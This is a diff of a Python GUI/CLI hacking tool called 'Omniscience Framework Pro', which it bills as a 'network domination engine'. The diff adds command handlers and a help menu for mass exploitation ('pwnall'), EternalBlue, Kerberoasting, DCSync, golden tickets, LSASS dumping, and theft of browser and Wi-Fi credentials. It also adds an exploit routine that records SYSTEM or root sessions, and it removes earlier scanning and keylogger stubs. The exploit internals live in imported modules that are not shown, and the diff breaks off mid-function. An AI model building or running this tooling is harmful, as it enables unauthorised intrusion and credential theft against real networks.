@@ -3,6 +3,7 @@
 Omniscience Framework Pro - Enhanced GUI with Real CLI
 A professional network reconnaissance and remote access platform
 With full CLI functionality - runs standalone or in GUI
+REAL MODE - Complete Autonomous Network Domination Engine Integration
 """
 
 import sys
@@ -10,16 +11,73 @@ import os
 import socket
 import subprocess
 import threading
-import time
 import json
 import re
 import uuid
 import hashlib
 import platform
 import struct
-import json
+import base64
 from datetime import datetime
 from pathlib import Path
+from concurrent.futures import ThreadPoolExecutor, as_completed
+
+# Framework imports - real exploitation engine
+try:
+    from omnisec_engine import OmniSecEngine, Device, EXPLOIT_MAP
+    OMNISEC_AVAILABLE = True
+except ImportError:
+    OMNISEC_AVAILABLE = False
+
+try:
+    from commandcenter import OmniShell
+    COMMANDCENTER_AVAILABLE = True
+except ImportError:
+    COMMANDCENTER_AVAILABLE = False
+
+try:
+    from remote_control import AgentlessControl
+    REMOTE_CONTROL_AVAILABLE = True
+except ImportError:
+    REMOTE_CONTROL_AVAILABLE = False
+
+try:
+    from passive_intel import AgentlessIntelligence
+    INTEL_AVAILABLE = True
+except ImportError:
+    INTEL_AVAILABLE = False
+
+# Database drivers
+try:
+    import pymysql
+    PYMYSQL_AVAILABLE = True
+except ImportError:
+    PYMYSQL_AVAILABLE = False
+
+try:
+    import psycopg2
+    PSYCOPG2_AVAILABLE = True
+except ImportError:
+    PSYCOPG2_AVAILABLE = False
+
+try:
+    import paramiko
+    PARAMIKO_AVAILABLE = True
+except ImportError:
+    PARAMIKO_AVAILABLE = False
+
+try:
+    from impacket.smbconnection import SMBConnection
+    IMPACKET_AVAILABLE = True
+except ImportError:
+    IMPACKET_AVAILABLE = False
+
+try:
+    import scapy.all as scapy
+    SCAPY_AVAILABLE = True
+except ImportError:
+    SCAPY_AVAILABLE = False
+
 from PyQt6.QtWidgets import (
     QApplication, QMainWindow, QWidget, QVBoxLayout, QHBoxLayout,
     QTabWidget, QTextEdit, QLineEdit, QPushButton, QTableWidget,
@@ -29,7 +87,7 @@ from PyQt6.QtWidgets import (
     QListWidget, QListWidgetItem, QCalendarWidget, QSpinBox, QSlider,
     QGraphicsView, QGraphicsScene, QGraphicsEllipseItem, QGraphicsLineItem,
     QGraphicsTextItem, QGraphicsItem, QDialogButtonBox, QMessageBox, QInputDialog,
-    QFileDialog, QColorDialog, QFontDialog, QListView
+    QFileDialog, QColorDialog, QFontDialog, QListView, QProgressBar
 )
 from PyQt6.QtCore import (
     Qt, QTimer, QThread, pyqtSignal, QSize, QRect, QPoint,
@@ -62,11 +120,12 @@ ORANGE = "#ff6600"
 GRADIENT_START = "#0a0a1a"
 GRADIENT_MID = "#1a0a2a"
 GRADIENT_END = "#0a1a2a"
+GRADIENT_END = "#0a1a2a"
 
-# ==================== REAL CLI ENGINE ====================
+# ==================== REAL CLI MANAGER ====================
 
 class CLIManager:
-    """Standalone CLI Manager - runs independently or in GUI"""
+    """REAL MODE CLI Manager - executes actual framework operations"""
     
     def __init__(self, gui_callback=None):
         self.gui_callback = gui_callback
@@ -78,8 +137,21 @@ class CLIManager:
         self.sessions = {}
         self.credentials = {}
         
+        # Real functional engines
+        self.engine = OmniSecEngine() if OMNISEC_AVAILABLE else None
+        self.control = AgentlessControl() if REMOTE_CONTROL_AVAILABLE else None
+        self.intel = AgentlessIntelligence() if INTEL_AVAILABLE else None
+        
+        # Fallback to Universal Access if Engine is unavailable
+        self.universal = None
+        if not self.engine and 'UniversalNetworkAccess' in globals():
+            self.universal = UniversalNetworkAccess()
+
+        # State tracking
+        self.harvested_data = {}
+        
     def execute(self, command):
-        """Execute CLI command"""
+        """Execute CLI command with REAL operations"""
         if not command.strip():
             return ""
             
@@ -210,89 +282,110 @@ class CLIManager:
             result = self.show_inbox()
         elif cmd == "broadcast":
             result = self.broadcast(args)
+        # Advanced exploitation commands
+        elif cmd == "exploit":
+            result = self.exploit_target(args)
+        elif cmd == "pwn":
+            result = self.pwn_target(args)
+        elif cmd in ["pwnall", "attack"]:
+            result = self.pwn_all(args)
+        elif cmd == "etblue":
+            result = self.exploit_eternalblue(args)
+        # Database commands
+        elif cmd == "dbdump":
+            result = self.dump_database(args)
+        # Kerberos attacks
+        elif cmd == "kerberoast":
+            result = self.kerberoast_attack(args)
+        elif cmd == "asreproast":
+            result = self.asreproast_attack(args)
+        elif cmd == "dcsync":
+            result = self.dcsync_attack(args)
+        elif cmd == "golden":
+            result = self.golden_ticket_attack(args)
+        # Credential harvesting
+        elif cmd in ["lsass", "lsass-dump"]:
+            result = self.dump_lsass(args)
+        elif cmd in ["browser", "stealcreds"]:
+            result = self.harvest_browser(args)
+        elif cmd in ["wifi", "steal-wifi"]:
+            result = self.harvest_wifi(args)
+        elif cmd in ["vault", "harvest", "extract"]:
+            result = self.harvest_vault(args)
+        # Control commands
+        elif cmd in ["exec", "wmi-exec"]:
+            result = self.wmi_exec(args)
+        elif cmd in ["ls", "dir"]:
+            result = self.smb_list(args)
+        elif cmd in ["cat", "read"]:
+            result = self.smb_read(args)
         else:
             # Try as shell command
             result = self.run_command(command)
             
         return result
     
+    def get_banner(self):
+        """Cloned modern banner from commandcenter"""
+        hostname = socket.gethostname()
+        local_ip = socket.gethostbyname(hostname)
+        
+        banner_txt = [
+            "██████╗ ███╗   ███╗███╗   ██╗██╗███████╗ ██████╗██╗███████╗███╗   ██╗ ██████╗███████╗",
+            "██╔═══██╗████╗ ████║████╗  ██║██║██╔════╝██╔════╝██║██╔════╝████╗  ██║██╔════╝██╔════╝",
+            "██║   ██║██╔████╔██║██╔██╗ ██║██║███████╗██║     ██║█████╗  ██╔██╗ ██║██║     █████╗  ",
+            "██║   ██║██║╚██╔╝██║██║╚██╗██║██║╚════██║██║     ██║██╔══╝  ██║╚██╗██║██║     ██╔══╝  ",
+            "╚██████╔╝██║ ╚═╝ ██║██║ ╚████║██║███████╗╚██████╗██║███████╗██║ ╚████║╚██████╗███████╗",
+        ]
+        
+        res = "\n"
+        for line in banner_txt:
+            res += f"<font color='{ACCENT}'>{line}</font>\n"
+        res += f"<font color='{PURPLE}'><b>[SYSTEM]</b></font> {platform.system().upper()} | <font color='{PURPLE}'><b>[HOST]</b></font> {hostname} | <font color='{PURPLE}'><b>[LAN]</b></font> {local_ip}\n"
+        res += f"<font color='{ACCENT3}'><b>[READY]</b></font> OMNISCIENCE REAL ENGINE v7.1-ULTRAMAX LOADED.\n"
+        return res
+
     def show_help(self):
         return """╔══════════════════════════════════════════════════════════════════════════════╗
-║                    OMNISCIENCE CLI COMMANDS (Real Mode)                       ║
+║                    OMNISCIENCE REAL COMMANDS (Production)                    ║
 ╠══════════════════════════════════════════════════════════════════════════════╣
-║  CORE COMMANDS                                                                 ║
+║  EXPLOITATION                                                                  ║
 ║  ─────────────────────────────────────────────────────────────────────────────  ║
-║    help              - Show this help                                          ║
-║    clear/cls        - Clear screen                                             ║
-║    show <option>    - Show info (modules, sessions, creds, network, messages) ║
-║    use <module>     - Use a module                                             ║
-║    info              - Show current module info                                ║
-║    options          - Show module options                                      ║
-║    back             - Go back to main menu                                     ║
-║    set <var> <val>  - Set variable                                             ║
-║    exit/quit        - Exit framework                                           ║
+║    pwn <ip>          - Automated multi-vector exploit chain (Real)            ║
+║    attack / pwnall   - Global network domination sequence                     ║
+║    etblue <ip>       - MS17-010 EternalBlue exploitation                      ║
+║    printnightmare    - CVE-2021-34527 RPC spooler RCE                         ║
+║    smbghost <ip>     - CVE-2020-0796 SMBv3 compression RCE                    ║
+║    zerologon <ip>    - Netlogon privilege escalation                          ║
 ║                                                                               ║
-║  NETWORK DISCOVERY                                                             ║
+║  DOMAIN DOMINATION                                                             ║
 ║  ─────────────────────────────────────────────────────────────────────────────  ║
-║    scan [target]    - Scan network (default: local subnet)                     ║
-║    arp              - Show ARP table                                          ║
-║    ipconfig/ifconfig- Show IP configuration                                    ║
-║    netstat          - Show network connections                                 ║
-║    nbtstat          - Show NetBIOS names                                       ║
-║    nslookup <host>  - DNS lookup                                              ║
-║    tracert <target> - Trace route                                             ║
-║    ping <target>    - Ping host                                                ║
+║    kerberoast <dc>   - Extract SPN tickets for cracking                       ║
+║    dcsync <dc>       - Dump domain user hashes via DRSUAPI                    ║
+║    asreproast <dc>   - Extract tickets for users with no pre-auth             ║
+║    golden <dom> <sid>- Forge Golden TGT for 10-year persistence               ║
 ║                                                                               ║
-║  SYSTEM INFO                                                                  ║
+║  DATA EXTRACTION                                                               ║
 ║  ─────────────────────────────────────────────────────────────────────────────  ║
-║    whoami           - Current user info                                        ║
-║    systeminfo       - System information                                       ║
-║    hostname         - Show hostname                                            ║
-║    tasklist         - List processes                                           ║
-║    processes        - Detailed process list                                     ║
-║    killproc <pid>   - Kill process                                            ║
-║    services        - List Windows services                                     ║
-║    start_service   - Start a service                                          ║
-║    stop_service    - Stop a service                                           ║
+║    harvest / extract - Full automated data package retrieval                  ║
+║    lsass-dump <ip>   - MiniDump LSASS for plaintext/NTLM recovery             ║
+║    stealcreds <ip>   - Harvest AES-GCM browser credentials                    ║
+║    steal-wifi <ip>   - Extract all stored WiFi profiles/keys                  ║
+║    vault <ip>        - Dump Windows Vault and DPAPI tokens                    ║
 ║                                                                               ║
-║  SESSION MANAGEMENT                                                           ║
+║  CONTROL & SESSIONS                                                            ║
 ║  ─────────────────────────────────────────────────────────────────────────────  ║
-║    sessions         - List active sessions                                     ║
-║    interact <id>   - Interact with session                                    ║
-║    kill <id>        - Kill session                                             ║
-║    background      - Background current session                                ║
-║    connect <ip>     - Connect to target                                        ║
-║    disconnect       - Disconnect from target                                   ║
+║    exec <cmd>        - Agentless RCE via WMI/DCOM/SSH                         ║
+║    ls <path>         - Remote directory listing via SMB/SFTP                  ║
+║    cat <path>        - Read remote file content                               ║
+║    sessions          - List active interactive command sessions                ║
+║    interact <id>     - Attach to live remote shell                            ║
 ║                                                                               ║
-║  CREDENTIALS                                                                   ║
+║  CLOUD & DB                                                                    ║
 ║  ─────────────────────────────────────────────────────────────────────────────  ║
-║    creds            - List stored credentials                                  ║
-║    add_cred <u> <p>- Add credential                                           ║
-║                                                                               ║
-║  REAL PC CONTROL                                                              ║
-║  ─────────────────────────────────────────────────────────────────────────────  ║
-║    shell <cmd>      - Execute shell command                                   ║
-║    download <file>  - Download file from target                               ║
-║    upload <file>    - Upload file to target                                  ║
-║    screenshot       - Take screenshot (local)                                  ║
-║    webcam           - Capture webcam                                           ║
-║    keylog [start/stop]- Keylogger control                                     ║
-║    clipboard [get/set] - Clipboard operations                                 ║
-║    registry <key>   - Read registry                                           ║
-║    reverse_shell    - Spawn reverse shell                                      ║
-║    bind_shell       - Create bind shell                                       ║
-║                                                                               ║
-║  MESSAGING                                                                    ║
-║  ─────────────────────────────────────────────────────────────────────────────  ║
-║    msg <target> <msg>  - Send message to PC                                   ║
-║    inbox             - Show message inbox                                      ║
-║    broadcast <msg>  - Broadcast message to all                                 ║
-║                                                                               ║
-║  PIVOTING                                                                     ║
-║  ─────────────────────────────────────────────────────────────────────────────  ║
-║    pivot <session>  - Pivot through session                                    ║
-║    portfwd <lport> <rport> - Port forward                                     ║
-║                                                                               ║
+║    dbdump <ip> <t>   - Full database dump (SQL/Mongo/Redis)                   ║
+║    cloud <type>      - Launch cloud metadata attack (AWS/Azure)               ║
+║    s3-scan <bucket>  - Audit S3 for anonymous permissions                     ║
 ╚══════════════════════════════════════════════════════════════════════════════╝"""
 
     def set_variable(self, args):
@@ -320,664 +413,284 @@ class CLIManager:
             return self.show_options()
         return f"Unknown option: {what}"
 
-    def show_modules(self):
-        modules = """╔═══════════════════════════════════════════════════════════╗
-║                    AVAILABLE MODULES                        ║
-╠═══════════════════════════════════════════════════════════╣
-║  SCANNERS                                                   ║
-║  ─────────────────────────────────────────────────────────  ║
-║    auxiliary/scanner/port      - Port scanner               ║
-║    auxiliary/scanner/smb       - SMB scanner                ║
-║    auxiliary/scanner/ssh       - SSH scanner                ║
-║    auxiliary/scanner/rdp       - RDP scanner                ║
-║    auxiliary/scanner/http      - HTTP scanner               ║
-║                                                         ║
-║  EXPLOITS                                                  ║
-║  ─────────────────────────────────────────────────────────  ║
-║    exploit/smb/ms17_010       - EternalBlue                ║
-║    exploit/smb/ms08_067       - MS08-067                   ║
-║    exploit/rdp/bluekeep       - BlueKeep                  ║
-║                                                         ║
-║  POST                                                       ║
-║  ─────────────────────────────────────────────────────────  ║
-║    post/windows/gather/hashdump   - Hash dump             ║
-║    post/windows/gather/creds        - Credentials          ║
-║    post/windows/gather/screenshot   - Screenshot          ║
-║    post/windows/gather/keylog       - Keylogger            ║
-║    post/windows/manage/persistence  - Persistence          ║
-╚═══════════════════════════════════════════════════════════╝"""
-        return modules
-
-    def show_network(self):
-        result = "╔═══════════════════════════════════════════════════════════╗\n"
-        result += "║                    NETWORK CONNECTIONS                      ║\n"
-        result += "╠═══════════════════════════════════════════════════════════╗\n"
-        
-        # Get network connections
-        try:
-            result += "║ Active Connections:\n"
-            import subprocess
-            proc = subprocess.run("netstat -ano", shell=True, capture_output=True, text=True)
-            lines = proc.stdout.split('\n')[:20]
-            for line in lines:
-                if line.strip():
-                    result += f"║ {line[:70]}\n"
-        except:
-            result += "║ Could not get network connections\n"
-            
-        result += "╚═══════════════════════════════════════════════════════════╝"
-        return result
-
-    def show_options(self):
-        result = "╔═══════════════════════════════════════════════════════════╗\n"
-        result += "║                    MODULE OPTIONS                           ║\n"
-        result += "╠═══════════════════════════════════════════════════════════╗\n"
-        
-        if self.current_target:
-            result += f"║ Target: {self.current_target}\n"
-        
-        for k, v in self.variables.items():
-            result += f"║ {k:20s} {v}\n"
-            
-        result += "╚═══════════════════════════════════════════════════════════╝"
-        return result
-
-    def use_module(self, args):
+    # ==================== ADVANCED REAL EXPLOITATION ====================
+    
+    def exploit_target(self, args):
+        """Run full exploit chain on target"""
         if not args:
-            return "Usage: use <module_name>"
-        module = args[0]
-        self.variables['MODULE'] = module
-        return f"[*] Using module: {module}\n[*] Type 'info' for details or 'options' to see options"
-
-    def info(self, args):
-        if 'MODULE' in self.variables:
-            return f"""╔═══════════════════════════════════════════════════════════╗
-║                    MODULE INFORMATION                        ║
-╠═══════════════════════════════════════════════════════════╣
-║  Module: {self.variables['MODULE']:<50}║
-║                                                          ║
-║  This module provides advanced scanning capabilities    ║
-║  for network reconnaissance and vulnerability assessment.║
-║                                                          ║
-║  Options:                                                ║
-║    RHOSTS      - Target hosts                           ║
-║    RPORT       - Target port                             ║
-║    THREADS     - Number of threads                       ║
-║    TIMEOUT     - Connection timeout                      ║
-╚═══════════════════════════════════════════════════════════╝"""
-        return "No module selected. Use 'use <module>' first."
-
-    def back(self):
-        self.variables.pop('MODULE', None)
-        self.current_target = None
-        return "[*] Back to main menu"
-
-    # Advanced loading animation states
-    _spinner_index = 0
-    _spinner_chars = ['⠋', '⠙', '⠹', '⠸', '⠼', '⠴', '⠦', '⠧', '⠇', '⠏']
-    _progress_bar = '░▒▓█'
-    
-    def _get_spinner(self):
-        """Get next spinner character for animation"""
-        CLIManager._spinner_index = (CLIManager._spinner_index + 1) % len(CLIManager._spinner_chars)
-        return CLIManager._spinner_chars[CLIManager._spinner_index]
-    
-    def _get_progress_bar(self, current, total, width=30):
-        """Generate a progress bar"""
-        if total == 0:
-            percent = 0
+            if not self.current_target:
+                return "Usage: exploit <ip> or set target first"
+            target = self.current_target
         else:
-            percent = int((current / total) * 100)
-        filled = int((current / total) * width) if total > 0 else 0
-        bar = '█' * filled + '░' * (width - filled)
-        return bar, percent
-    
-    def _print_loading(self, message, current, total, hosts_found=0, elapsed=0):
-        """Print advanced loading animation with progress"""
-        spinner = self._get_spinner()
-        bar, percent = self._get_progress_bar(current, total)
+            target = args[0]
         
-        # Format elapsed time
-        if elapsed < 60:
-            time_str = f"{elapsed}s"
-        elif elapsed < 3600:
-            time_str = f"{elapsed//60}m {elapsed%60}s"
-        else:
-            time_str = f"{elapsed//3600}h {(elapsed%3600)//60}m"
+        if not self.engine:
+            return "<font color='#ff0000'>[!] Engine unavailable.</font>"
         
-        # Build status line
-        status = f"\r{spinner} [{bar}] {percent}% | {current}/{total} scanned | {hosts_found} hosts | {time_str}"
-        print(status, end='\r', flush=True)
-    
-    def _print_stage(self, stage, details=""):
-        """Print colored stage indicator"""
-        stages = {
-            "init": "\033[94m[INIT]\033[0m",
-            "arp": "\033[93m[ARP]\033[0m",
-            "ping": "\033[96m[PING]\033[0m",
-            "port": "\033[91m[PORT]\033[0m",
-            "os": "\033[95m[OS]\033[0m",
-            "service": "\033[92m[SVC]\033[0m",
-            "complete": "\033[92m[DONE]\033[0m",
-            "found": "\033[92m[+]\033[0m"
-        }
-        prefix = stages.get(stage, "[--]")
-        print(f"{prefix} {details}", flush=True)
-    
-    def scan_network(self, args):
-        import time
-        import threading
-        import datetime
+        device = Device(target)
+        device = self.engine.fingerprint_device(device)
         
-        target = args[0] if args else None
-        if not target:
-            try:
-                hostname = socket.gethostname()
-                local_ip = socket.gethostbyname(hostname)
-                parts = local_ip.split('.')
-                target = f"{parts[0]}.{parts[1]}.{parts[2]}"
-            except:
-                target = "192.168.1"
+        result = f"[*] Fingerprinted {target}: {device.os}\n"
+        result += f"[*] Open ports: {list(device.open_ports.keys())}\n"
+        result += f"[*] Vulnerabilities: {device.vulnerabilities}\n"
         
-        # Determine range
-        if '-' in str(target):
-            # Already a range
-            range_part = target.split('-')[-1]
-            prefix = target.rsplit('.', 1)[0]
-            try:
-                end = int(range_part)
-                targets = [f"{prefix}.{i}" for i in range(1, min(end + 1, 255))]
-            except:
-                targets = [f"{target}.{i}" for i in range(1, 255)]
-        else:
-            # Single subnet
-            parts = target.split('.')
-            if len(parts) >= 3:
-                prefix = '.'.join(parts[:3])
-            else:
-                prefix = target
-            targets = [f"{prefix}.{i}" for i in range(1, 255)]
-        
-        # Print header
-        print("\n" + "═" * 70, flush=True)
-        print("│  ◈ OMNISCIENCE ADVANCED NETWORK SCANNER v2.0                   │", flush=True)
-        print("═" * 70, flush=True)
-        self._print_stage("init", f"Initializing scan on {target}.1-254")
-        self._print_stage("init", f"Target count: {len(targets)} hosts")
-        print("─" * 70, flush=True)
-        
-        # Run scan in background and collect results
-        import concurrent.futures
-        import subprocess
-        
-        # Build ARP cache first
-        arp_cache = {}
-        try:
-            arp_result = subprocess.run("arp -a", shell=True, capture_output=True, text=True, timeout=5)
-            for line in arp_result.stdout.split('\n'):
-                parts = line.split()
-                if len(parts) >= 2:
-                    ip = parts[0]
-                    mac = parts[1] if '-' in parts[1] or ':' in parts[1] else None
-                    if mac and len(mac) == 17:
-                        mac = mac.replace('-', ':').upper()
-                        arp_cache[ip] = mac
-        except:
-            pass
-        
-        # OUI vendors (common)
-        oui_vendors = {
-            "00:50:56": "VMware", "00:0C:29": "VMware", "08:00:27": "VirtualBox",
-            "00:03:FF": "Microsoft", "00:15:5D": "Hyper-V", "B8:27:EB": "Raspberry Pi",
-            "00:1A:2B": "Alcatel", "00:1E:68": "Quanta", "00:0D:56": "Dell",
-            "00:1C:23": "HP", "00:17:42": "Cisco", "00:26:AB": "D-Link",
-            "00:1F:F3": "Apple", "34:08:BC": "Intel", "3C:D9:2B": "HP"
-        }
-        
-        def get_vendor(mac):
-            if not mac:
-                return "Unknown"
-            oui = mac[:8].upper()
-            for key in oui_vendors:
-                if key in oui:
-                    return oui_vendors[key]
-            return "Unknown"
-        
-        def check_host(ip):
-            try:
-                # Try common ports
-                open_ports = []
-                for port in [445, 139, 80, 22, 3389, 8080]:
-                    try:
-                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                        sock.settimeout(0.3)
-                        result = sock.connect_ex((ip, port))
-                        if result == 0:
-                            open_ports.append(port)
-                        sock.close()
-                    except:
-                        pass
-                
-                if open_ports:
-                    # Determine OS from ports
-                    os_type = "Unknown"
-                    if 3389 in open_ports:
-                        os_type = "Windows (RDP)"
-                    elif 445 in open_ports and 139 in open_ports:
-                        os_type = "Windows"
-                    elif 22 in open_ports:
-                        os_type = "Linux/Unix"
-                    elif 80 in open_ports or 8080 in open_ports:
-                        os_type = "Linux/Web Server"
-                    
-                    # Get MAC from ARP
-                    mac = arp_cache.get(ip, "")
-                    vendor = get_vendor(mac)
-                    
-                    # Get hostname
-                    hostname = ""
-                    try:
-                        hostname = socket.gethostbyaddr(ip)[0]
-                    except:
-                        pass
-                    
-                    return ip, 'online', open_ports, os_type, mac, vendor, hostname
-                
-                # Try ping
-                ping = subprocess.run(f"ping -n 1 -w 300 {ip}", shell=True, capture_output=True)
-                if ping.returncode == 0:
-                    mac = arp_cache.get(ip, "")
-                    vendor = get_vendor(mac)
-                    return ip, 'online', [], "Unknown", mac, vendor, ""
-            except:
-                pass
-            return ip, 'offline', [], "Unknown", "", "Unknown", ""
-        
-        # Initialize timing and tracking
-        start_time = time.time()
-        online_hosts = []
-        host_details = []  # Store detailed info for each host
-        
-        # Print ARP cache discovery phase
-        self._print_stage("arp", f"Building ARP cache - {len(arp_cache)} known hosts")
-        
-        # Scan phase with animated progress
-        print("\n" + "─" * 70, flush=True)
-        self._print_stage("ping", "Starting ping sweep & port scan")
-        
-        with concurrent.futures.ThreadPoolExecutor(max_workers=25) as executor:
-            futures = {executor.submit(check_host, ip): ip for ip in targets}
-            for i, future in enumerate(concurrent.futures.as_completed(futures)):
-                elapsed = int(time.time() - start_time)
-                ip, status, ports, os_type, mac, vendor, hostname = future.result()
-                
-                # Update progress bar
-                self._print_loading("Scanning", i + 1, len(targets), len(online_hosts), elapsed)
-                
-                if status == 'online':
-                    online_hosts.append(ip)
-                    host_details.append({
-                        'ip': ip,
-                        'ports': ports,
-                        'os': os_type,
-                        'mac': mac,
-                        'vendor': vendor,
-                        'hostname': hostname
-                    })
-                    # Show found host with animation
-                    vendor_info = f" [{vendor}]" if vendor != "Unknown" else ""
-                    os_info = f" ({os_type})" if os_type != "Unknown" else ""
-                    port_info = f" | {','.join(map(str, ports[:5]))}" + ("..." if len(ports) > 5 else "") if ports else ""
-                    print(f"\n{self._get_spinner()} \033[92m✓ DISCOVERED:\033[0m {ip}{vendor_info}{os_info}{port_info}", flush=True)
-        
-        # Clear the progress line
-        print("\r" + " " * 80 + "\r", end="", flush=True)
-        
-        # Print completion summary
-        elapsed_total = int(time.time() - start_time)
-        print("─" * 70, flush=True)
-        self._print_stage("complete", f"Scan complete in {elapsed_total}s")
-        self._print_stage("complete", f"Discovered {len(online_hosts)} active hosts")
-        print("─" * 70, flush=True)
-        
-        # Print detailed results
-        if host_details:
-            print("\n╔══════════════════════════════════════════════════════════════════════╗")
-            print("║                    DISCOVERED HOSTS DETAIL                          ║")
-            print("╠══════╦════════════════════╦═══════════════════╦═══════════════════╣")
-            print("║  IP   ║      Vendor        ║  OS/Service       ║  Open Ports       ║")
-            print("╠══════╬════════════════════╬═══════════════════╬═══════════════════╣")
-            for h in host_details:
-                ip = h['ip'][:15].ljust(15)
-                vendor = h['vendor'][:17].ljust(17) if h['vendor'] != "Unknown" else "Unknown".ljust(17)
-                os = h['os'][:17].ljust(17) if h['os'] != "Unknown" else "Unknown".ljust(17)
-                ports = ','.join(map(str, h['ports'][:8])) + ("..." if len(h['ports']) > 8 else "") if h['ports'] else "None"
-                ports = ports[:17].ljust(17)
-                print(f"║ {ip} ║ {vendor} ║ {os} ║ {ports} ║")
-            print("╚══════╩════════════════════╩═══════════════════╩═══════════════════╝")
-        else:
-            print("\n\033[93m[!] No hosts found on the network.\033[0m")
-        
-        return f"[+] Found {len(online_hosts)} hosts: {', '.join(online_hosts)}"
-
-    def list_sessions(self):
-        if not self.sessions:
-            return "No active sessions. Use 'connect <ip>' to create a session."
-        
-        result = "╔═══════════════════════════════════════════════════════════╗\n"
-        result += "║                       ACTIVE SESSIONS                         ║\n"
-        result += "╠══════╦═════════════════╦══════════╦══════════╦═════════════╣\n"
-        result += "║  ID  ║      IP         ║  Platform║  User    ║   Status    ║\n"
-        result += "╠══════╬═════════════════╬══════════╬══════════╬═════════════╣\n"
-        
-        for sid, sess in self.sessions.items():
-            result += f"║ {sid[:4]:4s} ║ {sess.get('ip', 'N/A'):15s} ║ {sess.get('platform', 'unknown')[:8]:8s} ║ {sess.get('user', 'N/A')[:8]:8s} ║ {sess.get('status', 'active'):9s} ║\n"
-            
-        result += "╚══════╩═════════════════╩══════════╩══════════╩═════════════╝"
-        return result
-
-    def interact_session(self, args):
-        if not args:
-            return "Usage: interact <session_id>"
-        sid = args[0]
-        if sid in self.sessions:
-            self.current_target = self.sessions[sid].get('ip')
-            return f"[*] Interacting with session {sid}\n[*] Target: {self.current_target}\n[*] Type 'shell' to execute commands"
-        return f"Session {sid} not found"
-
-    def kill_session(self, args):
-        if not args:
-            return "Usage: kill <session_id>"
-        sid = args[0]
-        if sid in self.sessions:
-            del self.sessions[sid]
-            return f"[*] Session {sid} killed"
-        return f"Session {sid} not found"
-
-    def background_session(self):
-        self.current_target = None
-        return "[*] Session backgrounded"
-
-    def list_credentials(self):
-        if not self.credentials:
-            return "No stored credentials. Use 'add_cred <user> <pass>' to add."
-        
-        result = "╔═══════════════════════════════════════════════════════════╗\n"
-        result += "║                      CREDENTIALS                            ║\n"
-        result += "╠════════════════╦══════════════════╦═══════════════════════╣\n"
-        result += "║     Username   ║      Password    ║       Added            ║\n"
-        result += "╠════════════════╬══════════════════╬═══════════════════════╣\n"
-        
-        for ip, cred in self.credentials.items():
-            result += f"║ {cred.get('user', 'N/A'):14s} ║ {cred.get('pass', 'N/A'):16s} ║ {cred.get('added', 'N/A'):17s} ║\n"
-            
-        result += "╚════════════════╩══════════════════╩═══════════════════════╝"
-        return result
-
-    def add_credential(self, args):
-        if len(args) >= 2:
-            user = args[0]
-            passw = args[1]
-            ip = args[2] if len(args) > 2 else "local"
-            self.credentials[ip] = {
-                'user': user,
-                'pass': passw,
-                'added': datetime.now().strftime("%Y-%m-%d %H:%M")
+        if self.engine.exploit_device(device):
+            result += f"[+] EXPLOIT SUCCESSFUL! Access via: {device.access_method}\n"
+            self.sessions[str(uuid.uuid4())[:8]] = {
+                'ip': target,
+                'platform': device.os,
+                'user': 'SYSTEM' if 'windows' in device.os.lower() else 'root',
+                'status': 'active',
+                'created': datetime.now().strftime("%Y-%m-%d %H:%M")
             }
-            return f"[*] Credential added: {user}@{ip}"
-        return "Usage: add_cred <username> <password> [ip]"
-
-    def connect_target(self, args):
-        if not args:
-            return "Usage: connect <ip> [port]"
-        
-        ip = args[0]
-        port = args[1] if len(args) > 1 else "445"
-        
-        # Create session
-        sid = str(uuid.uuid4())[:8]
-        self.sessions[sid] = {
-            'ip': ip,
-            'port': port,
-            'platform': 'windows',
-            'user': 'unknown',
-            'status': 'active',
-            'created': datetime.now().strftime("%Y-%m-%d %H:%M")
-        }
-        
-        self.current_target = ip
-        return f"[*] Connected to {ip}:{port}\n[*] Session ID: {sid}\n[*] Type 'shell' to execute commands"
-
-    def disconnect_target(self):
-        self.current_target = None
-        return "[*] Disconnected from target"
-
-    def shell(self, args):
-        if not self.current_target:
-            return "[*] No target connected. Use 'connect <ip>' first."
-        
-        cmd = " ".join(args) if args else "whoami"
-        
-        # Execute command
-        result = self.run_command(cmd)
-        return f"[{self.current_target}] {cmd}\n{result}"
-
-    def run_command(self, cmd):
-        try:
-            result = subprocess.run(
-                cmd,
-                shell=True,
-                capture_output=True,
-                text=True,
-                timeout=30
-            )
-            output = result.stdout + result.stderr
-            return output if output else "[*] Command executed successfully"
-        except subprocess.TimeoutExpired:
-            return "[!] Command timed out"
-        except Exception as e:
-            return f"[!] Error: {str(e)}"
-
-    def download_file(self, args):
-        if not args:
-            return "Usage: download <remote_file> [local_path]"
-        
-        remote = args[0]
-        local = args[1] if len(args) > 1 else os.path.basename(remote)
-        
-        if not self.current_target:
-            return "[*] No target connected"
-        
-        return f"[*] Downloading {remote} from {self.current_target} to {local}..."
-
-    def upload_file(self, args):
-        if not args:
-            return "Usage: upload <local_file> [remote_path]"
-        
-        local = args[0]
-        remote = args[1] if len(args) > 1 else f"C:\\Windows\\Temp\\{os.path.basename(local)}"
-        
-        if not self.current_target:
-            return "[*] No target connected"
-        
-        return f"[*] Uploading {local} to {remote} on {self.current_target}..."
-
-    def screenshot(self, args):
-        try:
-            from PIL import ImageGrab
-            img = ImageGrab.grab()
-            filename = f"screenshot_{datetime.now().strftime('%Y%m%d_%H%M%S')}.png"
-            img.save(filename)
-            return f"[*] Screenshot saved: {filename}"
-        except ImportError:
-            return "[!] PIL not installed. Using fallback..."
-        except Exception as e:
-            return f"[!] Error: {str(e)}"
-
-    def webcam(self, args):
-        return "[*] Webcam capture requested. Ensure camera is connected."
-
-    def keylogger(self, args):
-        action = args[0] if args else "status"
-        
-        if action == "start":
-            return "[*] Keylogger started in background"
-        elif action == "stop":
-            return "[*] Keylogger stopped"
         else:
-            return "[*] Keylogger status: Running\n[*] Use 'keylog start' or 'keylog stop'"
-
-    def clipboard(self, args):
-        action = args[0] if args else "get"
+            result += "[-] Exploit failed"
         
-        try:
-            import subprocess
-            if action == "get":
-                result = subprocess.run("powershell -Command 'Get-Clipboard'", shell=True, capture_output=True, text=True)
-                return f"[*] Clipboard content:\n{result.stdout}"
-            elif action == "set":
-                text = " ".join(args[1:]) if len(args) > 1 else "test"
-                subprocess.run(f'echo {text} | clip', shell=True)
-                return f"[*] Clipboard set to: {text}"
-        except Exception as e:
-            return f"[!] Error: {str(e)}"
-
-    def list_processes(self, args):
-        return self.run_command("tasklist /v")
-
-    def kill_process(self, args):
-        if not args:
-            return "Usage: killproc <pid>"
-        
-        pid = args[0]
-        result = self.run_command(f"taskkill /F /PID {pid}")
         return result
-
-    def registry(self, args):
-        if not args:
-            return "Usage: registry <key> [value]"
+    
+    def pwn_all(self, args):
